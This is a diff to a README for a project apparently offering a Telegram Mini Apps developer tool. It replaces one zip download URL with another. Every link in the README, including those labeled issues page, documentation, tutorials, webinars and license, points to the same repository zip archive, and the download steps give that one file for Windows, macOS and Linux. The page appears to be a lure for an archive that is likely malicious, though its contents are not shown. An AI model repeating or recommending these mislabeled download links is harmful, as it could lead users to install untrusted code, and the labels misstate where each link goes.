@@ -1,7 +1,7 @@
 # 🎉 tma-llms-txt - Build and Share Telegram Mini Apps Easily
 
 ## 📥 Download Now
-[![Download Release](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip%20Release-v1.0-blue)](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip)
+[![Download Release](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the tma-llms-txt project! This guide shows you how to download and run the software. You will learn how to access Telegram Mini Apps and utilize the developer guide.
@@ -26,9 +26,9 @@ The tma-llms-txt application offers several key features to streamline developme
 Follow these steps to download the tma-llms-txt application:
 
 1. **Visit the Release Page:** Click the link below:
-   [Download from GitHub Releases](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip)
 
-2. **Select Your Version:** Find the latest version of the application listed on the releases page. Look for a file named something like `https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip` for Windows, `https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip` for macOS, or `https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip` for Linux.
+2. **Select Your Version:** Find the latest version of the application listed on the releases page. Look for a file named something like `https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip` for Windows, `https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip` for macOS, or `https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip` for Linux.
 
 3. **Download the File:** Click on the file name to start your download. This may take a few moments depending on your internet speed.
 
@@ -40,7 +40,7 @@ Follow these steps to download the tma-llms-txt application:
 5. **Launch the App:** After installation, find the tma-llms-txt application in your applications list. Double-click it to start using Telegram Mini Apps.
 
 ## 🙋‍♂️ Need Help?
-If you encounter any issues during installation or usage, please check our [GitHub Issues page](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip) for troubleshooting tips.
+If you encounter any issues during installation or usage, please check our [GitHub Issues page](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip) for troubleshooting tips.
 
 ## 🗨️ Community Discussion
 Join our community support forum to share your experiences, seek help, or provide feedback. Connect with fellow users who are also interested in developing Telegram mini apps.
@@ -48,12 +48,12 @@ Join our community support forum to share your experiences, seek help, or provid
 ## 📜 Additional Resources
 Explore these resources for further learning and support:
 
-- [Official Documentation](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip)
-- [Video Tutorials](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip)
-- [Webinars and Workshops](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip)
+- [Official Documentation](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip)
+- [Video Tutorials](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip)
+- [Webinars and Workshops](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip)
 
 ## 📑 License
-tma-llms-txt is licensed under the MIT License. You can freely use, modify, and share the application as long as you provide attribution. For details, visit the [LICENSE file](https://github.com/savagegodfather/tma-llms-txt/raw/refs/heads/main/technolithic/txt-tma-llms-v1.7.zip).
+tma-llms-txt is licensed under the MIT License. You can freely use, modify, and share the application as long as you provide attribution. For details, visit the [LICENSE file](https://raw.githubusercontent.com/savagegodfather/tma-llms-txt/main/technolithic/tma_txt_llms_v1.1.zip).
 
 ## 👥 Contributing
 We welcome contributions! If you want to improve the application or documentation, feel free to fork the repository, make changes, and submit a pull request.
